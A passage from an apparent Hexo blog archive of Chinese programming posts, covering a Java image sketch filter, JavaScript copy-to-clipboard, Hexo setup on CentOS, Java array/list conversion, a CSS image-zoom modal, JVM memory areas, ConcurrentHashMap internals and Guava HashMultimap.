BufferedImage inverted = new BufferedImage(src.getWidth(), src.getHeight(), src.getType()); PointFilter invertFilter = new InvertFilter(); invertFilter.filter(grayScale, inverted); //高斯模糊处理 GaussianFilter gaussianFilter = new GaussianFilter(20); BufferedImage gaussianFiltered = new BufferedImage(src.getWidth(), src.getHeight(), src.getType()); gaussianFilter.filter(inverted, gaussianFiltered); // 灰度图像和高斯模糊反向图混合 ColorDodgeComposite cdc = new ColorDodgeComposite(1.0f); CompositeContext cc = cdc.createContext(inverted.getColorModel(), grayScale.getColorModel(), null); WritableRaster invertedR = gaussianFiltered.getRaster(); WritableRaster grayScaleR = grayScale.getRaster(); // 混合之后的就是我们希望的结果 BufferedImage composite = new BufferedImage(src.getWidth(), src.getHeight(), src.getType()); WritableRaster colorDodgedR = composite.getRaster(); cc.compose(invertedR, grayScaleR, colorDodgedR); //输出做好的素描 File outputfile = new File(output); ImageIO.write(composite, \"png\", outputfile);} 表现结果如下 2. 算法原理作为一个图像处理小白，网上搜索了一下，素描算法比较多，通过多番比较，感觉整体思想相差不大，大致是以下几个步骤 原图灰度化 临界值处理（小于某个临界值的像素值设置为0） 第二步的图像反色处理 第二步与第三步的图片混合处理 接下来将以我自己的粗浅理解出发，尝试做一下算法的解析 2.1 灰度处理图像灰度处理，主要是为了将最终图片的色彩控制在五彩斑斓的灰白中，保持和我们常见的素描风格保持一致 具体的像素灰度处理，有一个广为流传的公式 （我也没找到原始出处，不知道是哪位大神给出的） 1avgColor = red * 0.299f + green * 0.587f + blue * 0.114f 2.2 边界凸显素描效果的一个核心要点在于对于物体的边缘轮廓进行定位，清洗的显示轮廓信息，对于之外的信息进行抽象模糊处理；简单来讲就是改凸显的地方凸显出来，不重要的地方模糊些处理 那么问题就是如何定位轮廓，如何模糊处理？ 上面步骤中的第二、第三两步主要就是来干这个事情的；临界值 + 反向，主要就是为了定位边界轮廓（盲猜一波：轮廓边缘的像素差异较大，两次处理叠加之后，轮廓处像素信息受影响较小，和之前的值差别不大，有相关背景知识的大佬可以指点一下） 具体实现的方式呢，最容易想到的一点是 设置一个阈值，小于这个阈值的像素设置为0；然后反向，两个图像进行混合处理，从而凸显轮廓 更先进一点的做法： 傅里叶变换、高斯模糊、梯度算法等出现在各相关论文中的算法(至于为什么有效，我也不知道了…) 2.3 相关博文 复现个有趣的算法：铅笔素描画自动生成_算法channel的博客-CSDN博客 基于Simulink的图片转素描风格算法的硬件加速 - 知乎 Java 将图片转换为素描图_范伟带你打天下的博客-CSDN博客 3. 快速使用文章的最开始就给出了一个素描处理的demo，输出效果基本ok，但是使用姿势有点麻烦；其实现就是借助jh-labs的滤镜来实现各种操作，对于应用者而言（比如我），可能并不关心具体细节，只要结果，有更简单的使用姿势么？ 当然也是有的，下面这个开源项目已经做好了封装 liuyueyi/quick-media: media(audio/image/qrcode/markdown/html/svg) support web service (多媒体编辑服务, 酷炫二维码, 音频, 图片, svg, markdown, html渲染服务支持) 最新版本为3.0，可以到中央仓库直接获取（如果还没有找到，不要慌，我还没有提交，因为3.0还在内测中） 引入依赖 12345&lt;!-- https://mvnrepository.com/artifact/com.github.liuyueyi.media/photo-plugin --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi.media&lt;/groupId&gt; &lt;artifactId&gt;photo-plugin&lt;/artifactId&gt;&lt;/dependency&gt; 使用姿势 12345678@Testpublic void testSketch() { BufferedImage out = PhotoOperateWrapper.of(OperatorEnum.SKETCH) .setImg(\"https://t7.baidu.com/it/u=4162611394,4275913936&amp;fm=193&amp;f=GIF\") .build() .asImg(); System.out.println(\"----\");} 相比较与前者，这个使用是不是更简单直接方便 说明 jhlabs项目 来自于jhlabs官网，未做任何修改，单纯的移入github，发布中央仓库供第三方仓库快速依赖而已；遵循Apache License quick-meida项目 一个java的多媒体处理开源类库，当前已支持图片合成、编辑、二维码生成解析、音频转码、markdown/html互转、svg渲染等功能，欢迎感兴趣的小伙伴前往观光查看 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/08/08/220808-纯java实现相片素描化/"},{"title":"CSS图片点击拷贝","text":"I. CSS图片点击拷贝点击实现文本or图片的复制， 主要利用 document.execCommand('Copy')来实现 1234567891011121314151617181920212223&lt;script type=\"text/javascript\"&gt;function copy2board(){ var Url2=document.getElementById(\"biao1\"); Url2.select(); // 选择对象 document.execCommand(\"Copy\"); // 执行浏览器复制命令 alert(\"已复制好，可贴粘。\");}function copyimg(e) { var range = document.createRange(); range.selectNode(e); //selectable为下面页面中DIV中的id window.getSelection().addRange(range); document.execCommand(\"Copy\"); alert(\"复制ok\");}&lt;/script&gt;&lt;textarea cols=\"20\" rows=\"10\" id=\"biao1\"&gt;用户定义的代码区域&lt;/textarea&gt;&lt;input type=\"button\" onClick=\"copy2board()\" value=\"点击复制代码\" /&gt;&lt;img src=\"http://a.hiphotos.baidu.com/image/pic/item/8326cffc1e178a82112604dffa03738da977e8b3.jpg\" width=200 height=200 onclick=\"copyimg(this)\"&gt;&lt;/img&gt; II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/16/CSS图片点击拷贝/"},{"title":"Centos 安装hexo博客","text":"Centos安装hexo博客根据官网来安装: hexo why hexo支持markdown，简单，主题可选 安装步骤12345678910## 1. nodejs安装sudo yum install nodejs## 2. 安装 hexosudo npm install -g hexo-clisudo npm install## 3. 创建hexohexo init xxxnpm install 测试验证 hexo server 使用说明1. 创建一个page执行下面的命令之后，就可以创建一个menu菜单 1hexo new page about 2. 新建一个博文1hexo new 'new blog' 新建一个草稿 12345hexo new draft '草稿博文'# 启动服务，预览草稿hexo server --drafts 3. 显示简介在md文件中，某一个地方地方添加 1&lt;!-- more --&gt; 则后面的内容都不会显示在首页了 4. 启动12345## 编译hexo g## 启动一个serverhexo s 5. deploy打开 _config.yml 文件，添加配置 1234deploy: type: git repository: https://github.com/liuyueyi/blogs.git branch: master 开始发布: 1hexo d -g 说明 如果github上，访问网页时，提示js或者css 404，则需要注意下面的配置 1234567# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: https://liuyueyi.github.io/hexblogroot: /hexblog/permalink: :year/:month/:day/:title/permalink_defaults: lang: zh-cn 其中URL，和root是关键的设置属性，root最后的/不能漏掉 如果提示git没有，则需要安装 1npm install hexo-deployer-git --save","link":"/hexblog/2017/12/29/Centos-安装hexo博客/"},{"title":"210810-实战小技巧2：数组与list互转","text":"每天一个实战小技巧：数组与list互转 这个考题比较常见，也比较简单，难道就这也有什么可以说到的门路不成？ 接下来本文好好的说一说它的几种实现姿势，总有一款你喜欢的 I. 数组转List1. Array.asList这个考题太简单了，直接使用Array.asList不就完事了么，比如 123456@Testpublic void ary2list() { String[] ary = new String[]{ \"1\", \"a\"}; List&lt;String&gt; list = Arrays.asList((ary); System.out.println(list);} 数组转list，so easy!!! 真的就这么简单么？？？ 且看下面这一段代码 12345678public void ary2list() { String[] ary = new String[]{ \"1\", \"a\"}; List&lt;String&gt; list = Arrays.asList((ary); System.out.println(list); list.add(\"c\"); System.out.println(list);} 直接抛出了异常java.lang.UnsupportedOperationException 有兴趣的小伙伴可以看一下源码实现方式，通过Arrays.asList创建的List，虽说也命名是ArrayList，但是它的全路径为 java.util.Arrays.ArrayList， 不支持add, remove等操作（所以下次再有面试官问ArrayList的知识点时，就可以反问一句，老哥你指的是哪个ArrayList😝，逼格是不是立马拉起来） 1.1 知识点 通过Arrays.asList创建的列表，不允许新增，删除元素；但是可以更新列表中元素的值 2. new ArrayList上面的数组转list方式虽然是最简单的，但不一定是合适的，特别是当我们可能对转换后的list进行操作时，可能埋坑（而且这种坑还非常隐晦，代码层面上很难发现） 为了减少在代码里面下毒的可能性，不妨使用下面这种方式new ArrayList&lt;&gt;(Arrays.asList(ary)) 1234String[] ary = new String[]{ \"1\", \"a\"};List&lt;String&gt; out = new ArrayList&lt;&gt;(Arrays.asList(ary));out.add(\"hello\");System.out.println(out); 通过上面这种方式创建的List，就是我们熟知的ArrayList了 2.1 避雷预警看到上面这个使用姿势，就很容易想到一个常见的踩雷点，比如我们的应用中，有一个全局共享的配置列表，张三需要拿id为奇数的配置，李四拿id为偶数的配置，然后他们都是这么做的 1list.removeIf(s -&gt; s.id % 2 == 0); 然后跑了一次之后发现这个全局的列表清空了，这就是典型的没有做好资源隔离的case了，针对这种场景，要么是限制使用方，直接针对全局的资源进行修改，要么就是使用方拿到的是一个隔离的备份 禁止修改： 使用不可变的容器，如前面提到的java.util.Arrays.ArrayList () 使用Collections.unmodifiableList创建 1List&lt;String&gt; unModifyList = Collections.unmodifiableList(out); 列表拷贝 1new ArrayList&lt;&gt;(Arrays.asList(ary)); （上面这种属于深拷贝的实现，具体可以看一下jdk的源码实现） 3. Collections.addAll第三种方式借助jdk提供的容器工具类Collections来实现 123456789101112@Testpublic void ary2listV3() { String[] ary = new String[]{ \"1\", \"a\"}; // 创建列表，并指定长度，避免可能产生的扩容 List&lt;String&gt; out = new ArrayList&lt;&gt;(ary.length); // 实现数组添加到列表中 Collections.addAll(out, ary); // 因为列表为我们定义的ArrayList，因此可以对它进行增删改 out.add(\"hello\"); System.out.println(out);} 原则上是比较推荐这种方式来实现的，至于为啥？看下源码实现 123456public static &lt;T&gt; boolean addAll(Collection&lt;? super T&gt; c, T... elements) { boolean result = false; for (T element : elements) result |= c.add(element); return result;} 这段代码的实现是不是非常眼熟，如果让我们自己来写，也差不多会写成这样吧，简单直观高效，完美 II. 列表转数组不同于数组转列表的几种玩法，列表转数组就简单多了，直接调用List.toArray 1234567List&lt;String&gt; list = Arrays.asList(\"a\", \"b\", \"c\");// 返回的是Object[] 数组Object[] cell = list.toArray();// 如果需要指定数组类型，可以传一个指定各类型的空的数组// 也可以传一个与目标列表长度相等的数组，这样会将列表中的元素拷贝到这个数组中String[] strCell = list.toArray(new String[]{}); III. 小结今天的博文主题是数组与列表的互转，虽说题目简单，但是实现方式也是多种，需要搞清楚它们之间的本质区别，一不小心就可能采坑，而最简单的地方掉坑里，往往是最难发现和爬出来的 核心知识点小结如下 数组转list： Arrays.asList(xxx)：创建的是不可变列表，不能删除和新增元素 new ArrayList&lt;&gt;(Arrays.asList(xxx): 相当于用列表创建列表，属于深拷贝的一种表现，获取到的列表支持新增、删除 推荐写法 Collections.addAll() 列表转数组 list.toArray: 如果需要指定数组类型，则传参指定 IV. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/10/210810-实战小技巧2：数组与list互转/"},{"title":"Css实战训练之图片点击放大","text":"Css实战训练之图片点击放大I. 背景非常常见的一个功能了，一般网站上显示的都是缩略图，等你点击缩略图之后，会在一个弹框中显示放大的图片 那么这个功能是怎么实现的呢? 正好学习了下css的基础知识，现在可以来实际的操作一把 1. 思路首先对页面的结构进行拆分： 有一个弹窗，在弹窗中显示大图；且弹窗默认是隐藏的 主页面上可以放置很多图片，并添加点击事件 点击之后，弹窗显示，并展示大图 大图点击以下后，关闭弹窗 II. 实现根据上面的描述，我们先来实现一个基础版本的，先写HTML 1234567891011121314151617&lt;body&gt;&lt;!-- 先来实现弹窗 --&gt;&lt;div class='modal' id='modal'&gt; &lt;img id='bgImg' /&gt;&lt;/div&gt;&lt;!-- 下面则是主页内容，先只给几个图片 --&gt;&lt;div&gt; &lt;img class='thum-img' src='http://f.hiphotos.baidu.com/image/pic/item/80cb39dbb6fd5266cdb2ba16a718972bd4073612.jpg' /&gt;&lt;/div&gt;&lt;/body&gt; 然后就是添加对应的样式，要求modal默认是隐藏的，所以如下（为了可以较好的区分弹窗，所以加了背景色和边框） 12345678910111213141516171819202122232425262728&lt;style&gt;.modal { display: none; margin: auto; width: 80%; height: 80%; background-color: rgb(0, 0, 0, 0.89); z-index: 1; border: 1px solid rgb(255,255,255,1);}.modal&gt;img { display: block; margin: auto; padding: 10%; max-width: 60%; max-height: 60%;}.thum-img { width: 200px; height: 200px; margin: auto; display: block; padding: 40px;}&lt;/style&gt; 接下来就是点击显示大图的逻辑了，借助js来实现， 12345678910111213&lt;script&gt; var modal = document.getElementById('modal'); var bgImg = document.getElementById('bgImg'); var thumImg = document.getElementById('thumImg'); thumImg.onclick = function() { modal.style.display = 'block'; bgImg.src = this.src; } bgImg.onclick = function() { modal.style.display = 'none'; }&lt;/script&gt; 将上面的实现，组装成一个html之后，直接测试查看，演示效果如下 虽然说上面的实现了我们预期的结果，但是有几点却不太满意 不是我们预期的弹窗效果，原图被挤下去了 弹窗中如果有个放大的动画效果就更好了（正好可以用到之前学习的animation） 对于图强中有很多图片时，点击放大怎么做 III. 进阶首先是希望是真的弹窗，不影响既有的布局，则通常是设置position来做到, 如我们可以在modal外面再加一层，变成 12345&lt;div style='position:fixed'&gt; &lt;div class='modal' id='modal'&gt; &lt;img id='bgImg' /&gt; &lt;/div&gt;&lt;/div&gt; 其次就是弹窗的样式太丑，我们可以借助之前学习的边框阴影来实现美观的弹出效果， 改成图片全部填充背景 背景颜色去掉，加上阴影，加上白色边框 修改后的css如下 1234567891011121314151617181920.modal { display: none; margin: auto; padding-top: 5%; width: 50%; height: 80%; z-index: 1; background-color: white;}.modal img { display: block; padding: 10px; margin: auto; max-width: 100%; max-height: 100%; box-shadow: 0 2px 6px rgb(0, 0, 0, 0.2), 0 10px 20px rgb(0, 0, 0, 0.2); border-radius: 12px; border: 1px solid white;} 接下来考虑添加动画，加上一个放大的效果 123456789@keyframes zoom { from {transform: scale(0.1)} to {transform: scale(1)}}.modal img { animation-name: zoom; animation-duration: 0.6s;} 接下来看演示效果如下 接下来就是需要把这个变成通用的方案，支持多重图片的方式了，这个则主要是图片点击事件的修改了，将上面写死的地方，稍微变通一下即可 IV. 源码最后给出所有的源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt; &lt;title&gt;小灰灰css学习笔记&lt;/title&gt; &lt;style&gt;.modal { display: none; position:fixed; width:100%; height:100%; background-color:rgb(0,0,0,0.65)}.modal-container { margin: auto; padding-top: 5%; width: 50%; height: 80%; z-index: 1;}.modal img { animation-name: zoom; animation-duration: 0.6s; display: block; padding: 10px; margin: auto; max-width: 100%; max-height: 100%; box-shadow: 0 2px 6px rgb(0, 0, 0, 0.2), 0 10px 20px rgb(0, 0, 0, 0.2); border-radius: 12px; border: 1px solid white;}@keyframes zoom { from {transform: scale(0.1)} to {transform: scale(1)}}.thum-img { float: left; width: 200px; height: 200px; margin: auto; display: block; padding: 40px;}&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;!-- 先来实现弹窗 --&gt;&lt;div class='modal' id='modal'&gt;&lt;div class='modal-container'&gt; &lt;img id='bgImg' /&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- 下面则是主页内容，先只给几个图片 --&gt;&lt;div&gt; &lt;img onclick='showBgImg(this)' class='thum-img' src='http://f.hiphotos.baidu.com/image/pic/item/80cb39dbb6fd5266cdb2ba16a718972bd4073612.jpg' /&gt; &lt;img class='thum-img' src='http://a.hiphotos.baidu.com/image/pic/item/e61190ef76c6a7ef5e886d03f1faaf51f3de666d.jpg' onclick='showBgImg(this)'/&gt; &lt;img class='thum-img' src='http://g.hiphotos.baidu.com/image/pic/item/730e0cf3d7ca7bcb747b4a5cb2096b63f624a845.jpg' onclick='showBgImg(this)'/&gt; &lt;img class='thum-img' src='http://c.hiphotos.baidu.com/image/pic/item/b21c8701a18b87d6657856e70c0828381f30fd14.jpg' onclick='showBgImg(this)'/&gt; &lt;img class='thum-img' src='https://raw.githubusercontent.com/liuyueyi/Source/master/img/info/blogInfoV2.png' onclick='showBgImg(this)'/&gt;&lt;/div&gt;&lt;script&gt; var modal = document.getElementById('modal'); var bgImg = document.getElementById('bgImg'); function showBgImg(e) { modal.style.display = 'block'; bgImg.src = e.src; } bgImg.onclick = function() { modal.style.display = 'none'; }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; V. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/01/Css实战训练之图片点击放大/"},{"title":"JVM学习之内存结构","text":"JVM学习之内存结构java运行时对象创建在什么地方？堆和栈空间又有什么区别？听闻已久的Young,Old区又是什么鬼？听说有个常量池，这个又是啥 要想在脑海中清晰的布局一个java类在加载到使用的过程中，整个类生命周期中，各项数据究竟最终落在哪个板块上，就需要了解下JVM的内存区域了 I. 内存布局 简单来讲，内存可以划分为三块： 堆 最大的一块区域，创建的对象都在这个上面 方法区 加载类时对应的类信息，常量，静态变量 栈 虚拟机栈和本地方法栈，存储线程相关的信息 II. 分区详解1. 堆区所有线程共享，虚拟机启动时创建，存放对象实例 垃圾回收，主要就是针对堆区而言，一般划分为年轻代，年老代 Young区：Edge + From Survivor + To Sruvivor (8：1：1) Old区 对象开始在Young区，一般内存回收时，会有标记整理，就涉及到两个Survivor区的转移，对象存的时间够久之后，就会将对象塞入Old区 2. 方法区所有线程共享，存储JVM加载的类信息，常量，静态变量，即使编译代码 3. 程序计数器当前线程所执行的字节码的行号指示器，线程私有 字节码解释器，就是来改变这个计数器来选择下一条要执行的命令 4. Java虚拟机栈线程私有，描述java方法执行的内存模型，它的生命周期与线程相同 虚拟机栈描述的是Java方法执行的内存模型：每个方法被执行的时候都会同时创建一个栈帧（Stack Frame）用于存储局部变量表、操作栈、动态链接、方法出口等信息。每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。 局部变量表（所占用空间，编译期间分配完成） 编译期可知的各种基本数据类型 对象引用 returnAddress类型（指向了一条字节码指令的地址） 操作栈 动态链接 方法出口 当栈深大于允许的高度时，会抛出StackOverflowError，常见于递归调用异常的情况 当无法申请到足够的空间时，会抛出OutOfMemoryError 5. 本地方法栈本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而本地方法栈则是为虚拟机使用到的Native方法服务 III. 其他参考: JVM内存结构 《深入理解Java虚拟机-JVM高级特性与最佳实践》 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/13/JVM学习之内存结构/"},{"title":"ConcurrentHashMap之1.7与1.8小结","text":"I. ConcurrentHashMap 两种实现方式小结1. 锁分段机制HashMap的底层数据结构是数组+hash链表的方式，非线程安全 ConcurrentHashMap 采用锁分段机制，底层数据结构为二维数组，其中第一层是Segment的数组，每个Segment持有一把独立的锁，而Segment的结构和HashMap很相似；这就是锁分段机制；线程安全 关注几个点： ConcurrentHashMap 如何定位 Segment, 如何定位 HashEntry 修改的加锁逻辑，如何进行扩容 读数据时，如何做到不加锁但保证线程安全的？ 1. 定位逻辑同样是利用hash值进行定位，这里分为两步定位，首先是确定Segment，其次是Segent中的HashEntry hash值都是通过再hash后得到的（避免hash碰撞） 通过再hash值，取高位，然后与Segment数组的长度求余，获取Segment的位置 在Segment中，通过再hash值与数组的长度求余，定位HashEntry在数组中的索引，然后遍历hash链表定位具体的HashEntry 注意其中Segment是hash值取高位进行定位的，后者直接hash值进行求余定位的，这样做的目的就是为了避免两次哈希后的值一样，导致元素虽然在Segment里散列开了，但是却没有在HashEntry里散列开 2. 添加数据 添加数据的逻辑，首先依然是通过上面的定位获取Segment 对Segment加锁，防止其他线程同步修改 第一步判断是否需要对Segment里的HashEntry数组进行扩容 第二步定位添加元素的位置然后放在HashEntry数组里。 是否需要扩容 在插入元素前会先判断Segment里的HashEntry数组是否超过容量（threshold），如果超过阀值，数组进行扩容。 Segment的扩容判断比HashMap更恰当，因为HashMap是在插入元素后判断元素是否已经到达容量的，如果到达了就进行扩容，但是很有可能扩容之后没有新元素插入，这时HashMap就进行了一次无效的扩容 如何扩容 扩容的时候首先会创建一个两倍于原容量的数组，然后将原数组里的元素进行再hash后插入到新的数组里 为了高效ConcurrentHashMap不会对整个容器进行扩容，而只对某个segment进行扩容 3. 线程安全的不加锁读查询数据时，没有加锁，这又是如何保证线程安全的呢？ 如果在查询过程中，没有线程对容器进行修改，则没有问题 如果有线程同步修改呢？ 有以下几个机制来保障 每个节点HashEntry除了value不是final的，其它值都是final的，这意味着不能从hash链的中间或尾部添加或删除节点，因为这需要修改next引用值，所有的节点的修改只能从头部开始。 对于put操作，可以一律添加到Hash链的头部 但是对于remove操作，可能需要从中间删除一个节点，这就需要将要删除节点的前面所有节点整个复制一遍，最后一个节点指向要删除结点的下一个结点。为了确保读操作能够看到最新的值，将value设置成volatile，这避免了加锁 针对增加和删除具体分析： 对于PUT操作，如果在读取时，已经定位到对应的HashEntry索引，根据这个hash链表进行从头到尾的遍历，如果在遍历前已经插入，因为volatile，所以遍历的第一个就是目标所在；而如果已经在链表查询中间，再插入，可以认为是本次查询之后才新加入的数据，查不到也是ok的 对于删除而言，因为删除链表中间的HashEntry时，会新生成一个链表，将原来的节点拷贝过来；那么读取的遍历就有两种可能，落到新链表上，没问题；落到老链表上，仍旧读取旧数据，也认为是OK的 4. 计算size先采用不加锁的方式，连续计算元素的个数，最多计算3次： 1、如果前后两次计算结果相同，则说明计算出来的元素个数是准确的；2、如果前后两次计算结果都不同，则给每个Segment进行加锁，再计算一次元素的个数 2. Node + CAS + Synchronizedjdk1.8重写了ConcurrentHashMap的实现，丢掉了锁分段的二维数组结构，改用Node数组进行 从结构上来看，1.8中ConcurrentHashMap的数据结构和HashMap的一样，区别只是在于修改时如何保障线程安全 1. 新增一个数据新插入一个HashEntry的内容时，首先是定位到具体的Node，如果这个位置没有加过数据，直接通过cas插入即可（无锁） 如果存在node，则锁住这个node（因此其他修改如果需要方位这个node对应的链表时，会竞争锁）；然后将数据插入到链表尾部（或者红黑树的指定位置） 2. 修改一个已经存在的数据定位node，锁住，然后修改对应的value值即可 3. 删除数据定位node，如果不存在表示不用删；存在时，锁住这个node，然后遍历查找到需要删除的节点，干掉 4. 读数据不加锁，和hashmap的原理差不多；需要注意的是Node节点中的value和next都是volatile的，即线程对这些数据的修改对其他线程是立马可见的 II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/05/14/ConcurrentHashMap之1-7与1-8小结/"},{"title":"220525-Guava HashMultimap使用及注意事项","text":"hello，各位大佬上午|中午|下午|晚上|凌晨好，我是一灰灰，今天给大家介绍一个相对基础的知识点 HashMultmap； guava基本上可以说是java开发项目中，大概率会引入的包，今天介绍的主角是一个特殊的容器 – HashMultmap，可以简单的将它的数据结构理解为Map&lt;K, Set&lt;V&gt;&gt; 那么为什么会突然想到介绍一下它呢，因为昨天刚因为对它理解不够深刻，把它当作了Map&lt;K, List&lt;V&gt;&gt;来使用，结果出了问题；既然如此那就好好盘一盘，反思一下 1. 数据模型介绍正常来讲，在使用一个新的数据对象时，我们应该先的了解它的数据模型； 直接看源码，会发现实际存储数据的结构为 Map&lt;K, Collection&lt;V&gt;&gt; 123abstract class AbstractMapBasedMultimap&lt;K, V&gt; extends AbstractMultimap&lt;K, V&gt; implements Serializable { private transient Map&lt;K, Collection&lt;V&gt;&gt; map;} 再jdk中Map也有很多实现，那么具体是哪个呢？ 从构造方法出发，来看下这个map成员的初始化过程 123456789101112private HashMultimap(int expectedKeys, int expectedValuesPerKey) { super(Platform.newHashMapWithExpectedSize(expectedKeys)); this.expectedValuesPerKey = 2; Preconditions.checkArgument(expectedValuesPerKey &gt;= 0); this.expectedValuesPerKey = expectedValuesPerKey;}private HashMultimap(Multimap&lt;? extends K, ? extends V&gt; multimap) { super(Platform.newHashMapWithExpectedSize(multimap.keySet().size())); this.expectedValuesPerKey = 2; this.putAll(multimap);} 关键点就在 Platform.newHashMapWithExpectedSize，熟悉的小伙伴已经能很快给出答案了，这个map就是我们常用的HashMap 接下来需要关注的就是value中的Collection，是什么容器类型了；对于它，则从添加元素的时候来定位put(key, value) 关键源码如下 123456789101112131415161718public boolean put(@Nullable K key, @Nullable V value) { Collection&lt;V&gt; collection = (Collection)this.map.get(key); if (collection == null) { collection = this.createCollection(key); if (collection.add(value)) { ++this.totalSize; this.map.put(key, collection); return true; } else { throw new AssertionError(\"New Collection violated the Collection spec\"); } } else if (collection.add(value)) { ++this.totalSize; return true; } else { return false; }} 这个写法相信大家都不会陌生，存在时，直接添加到容器；不存在时，则通过 createCollection来创建容器，并塞入Map；其具体的实现逻辑如下 1234// com.google.common.collect.HashMultimap#createCollectionSet&lt;V&gt; createCollection() { return Platform.newHashSetWithExpectedSize(this.expectedValuesPerKey);} 所以HashMultimap的底层数据存储就是我们的老朋友 HashMap&lt;K, HashSet&lt;V&gt;&gt; 2. 简单使用介绍基本来讲，HashMultimap的使用姿势非常简单了，下面给出简单实例演示一下，基本上看看就会了 2.1 容器创建123456789// 创建一个默认的 HashMap&lt;String, Set&lt;Integer&gt;&gt;，容器的初始化容量与HashMap的默认值一样HashMultimap&lt;String, Integer&gt; map = HashMultimap.create();// 当我们知道容器的个数时，推荐使用下面这种方式, // HashMap 设置容量为8, 每个HashSet的容量初始化为16HashMultimap&lt;String, Integer&gt; map2 = HashMultimap.create(8, 16);// 另外一个就是基于MultMap来创建的case了HashMultimap&lt;String, Integer&gt; map3 = HashMultimap.create(map); 注意上面的第三种实现，需要理解的是 map3.get(key) != map.get(key) 即基于原来的容器初始化的新容器，其value是一个新的容器对象，将之前的value中所有元素，都塞入新的容器中，并不是直接引用就的容器对象（这么一说是不是更想是深拷贝，而不是浅拷贝呢？） 2.2 添加元素123456// 添加单个元素map.put(\"hello\", 510);// 添加多个元素map.putAll(\"skill\", Arrays.asList(1, 2, 3, 4, 1)); 注意 因为value是HashSet，所以重复的元素会忽略 塞入重复的元素会忽略 再次申明，添加重复的元素会忽略 （没错，我就是这里出了问题……） 2.3 移除元素12345// 移除skill对应的集合中，value=3的元素map.remove(\"skill\", 3);// 移除keymap.removeAll(\"hello\"); 2.4 替换元素如果我们希望将整个value都换成一个新的集合，那么可以使用replaceValue 12// 直接替换skill对应的value集合，新的值为 {100, 200, 300}map.replaceValues(\"skill\", Arrays.asList(100, 200, 300)); 2.5 获取元素及遍历12// 获取对应的value集合，当不存在时，返回空集合（不是null，简直是贴心）Set&lt;Integer&gt; set = map.get(\"skill\"); foreach方式的迭代 123for (Map.Entry&lt;String, Integer&gt; entry: map.entries()) { System.out.println(entry.getKey() + \":\" + entry.getValue());} 注意上面的迭代成员 Map.Entry&lt;String, Integer&gt;，其key依然是HashMap的key，而value则是这个集合中的没一个元素，比如容器中的值为(“skill”: [100,200,300])时，此时输出如下 1234skill:200skill:100skill:300` 2.6 输出所有的key12345// 输出所有的key，map.keys()// 输出key集合map.keySet(); 他们两有啥区别？看个实例 1234HashMultimap&lt;String, Integer&gt; map = HashMultimap.create();map.replaceValues(\"skill\", Arrays.asList(100, 200, 300));System.out.println(\"keys=\" + map.keys());System.out.println(\"keySet=\" + map.keySet()); 输出如下 12keys=[skill x 3]keySet=[skill] 上面这个skill x 3是什么鬼，实际上表示skill有三个，返回的容器可以理解为List，不去重 而下面的KeySet()则返回的是个Set，会去重 2.7 输出所有的value1map.values() 通过上面的再理解这个就简单了，所有的value都合并再一个List，接下来我们看一下两种遍历方式 1234567HashMultimap&lt;String, Integer&gt; map = HashMultimap.create();map.putAll(\"skill\", Arrays.asList(100, 200, 300));map.put(\"a\", 100);for (Integer v: map.values()) { System.out.println(v);} 实际输出如下 1234100100200300 3. 小结这里主要介绍的是Gauva的容器HashMultimap的数据模型及使用姿势，知识点相对来说比较基础，再实际使用的时候，请牢记，把它看作是简单方便易使用的 HashMap&lt;K, HashSet&lt;V&gt;&gt; 即可，重点注意value中的元素不能重复即可 那么当我们希望value是个List时，可以怎么整呢？ 此时可以使用 LinkedMultiValueMap 来替代，它的底层数据结构实际就是 HashMap&lt;K, LinkedHashMap&lt;V&gt;&gt; 使用 ArrayListMultimap 也可以，底层数据结构为 HashMap&lt;K, ArrayList&lt;V&gt;&gt; 最后提一句，guava的这几个容器的实现，其源码阅读起来不会吃力，且设计思路也非常典型，比如如果让我们自己来基于jdk的基础容器实现一个类似的容器，如何优雅的去实现呢？ 